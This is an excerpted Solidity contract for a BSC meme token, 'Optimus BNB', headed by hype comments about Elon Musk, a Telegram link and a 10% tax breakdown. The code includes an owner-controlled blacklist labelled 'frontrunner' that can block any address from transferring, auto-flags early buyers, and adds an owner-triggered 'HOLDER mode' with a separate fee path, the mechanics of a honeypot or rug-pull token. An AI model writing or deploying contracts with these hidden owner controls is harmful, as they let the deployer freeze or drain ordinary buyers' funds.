...
// Hype meme token who will make shocking impact on BSC network.
// Triggered by Elon Musk visionary ideas to improving quality of humanlive.
// By rewarding the holder on BNB ( 7% BNB rewards out of 10% total tax ), we strive to empower the community.

// Telegram             : https://t.me/+sExo9C9BKZFjMTU1
// Tax                  : 10/10 %
//      - BNB Rewards 7%
//      - LP 1%
//      - Marketing 1%
//      - Dev 1%
// LP lock              : 1 MONTH (extend if reach certain MC)
// Max Wallet & Max Tx  : 2%
...
/* Token contract */
contract OPTBNB is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    address DEV = 0xd53032a9E9cF04ba7015AB0c67a3Ab1AcE691B88;
    ...
    // Name and symbol
    string constant _name = "Optimus BNB";
    string constant _symbol = "OPTBNB";
    ...
    mapping (address => bool) public isFrontrunner;
    ...
    // HOLDER
    uint256 HOLDERTriggeredAt;
    uint256 HOLDERDuration = 1800;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver =0xBe27071C5591d5bEBdd900D9915F359F9fE82684;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        // Check if address is frontrunner
        require(!isFrontrunner[recipient] && !isFrontrunner[sender], 'Address is frontrunner');

        // Check if trading is enabled
        if(!authorizations[sender] && !authorizations[recipient] && !isFeeExempt[sender] && !isFeeExempt[recipient] && !tradingOpen && sender == pair){
                isFrontrunner[recipient] = true;
        }
        ...
        // Check if we are in HOLDERTime
        bool HOLDERMode = inHOLDERTime();
        ...
        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount, isSell, HOLDERMode) : amount;
    ...
    // Check if we are in HOLDER time
    function inHOLDERTime() public view returns (bool){
        if(HOLDERTriggeredAt.add(HOLDERDuration) > block.timestamp){
            return true;
        } else {
            return false;
        }
    ...
    // Take the normal total Fee or the HOLDER Fee
    function takeFee(address sender, uint256 amount, bool isSell, bool HOLDERMode) internal returns (uint256) {
        uint256 feeAmount;
        
        // Check if we are HOLDERd
        if (HOLDERMode){
            if(isSell){
    ...
    // Enable HOLDER
    function enableHOLDER(uint256 _seconds) public authorized {
        HOLDERTriggeredAt = block.timestamp;
        HOLDERDuration = _seconds;
    }

    // Disable the HOLDER mode
    function disableHOLDER() external authorized {
        HOLDERTriggeredAt = 0;
    }
    ...
    // frontrunner/unfrontrunner an address
    function frontrunnerAddress(address _address, bool _value) public authorized{
        isFrontrunner[_address] = _value;
    }
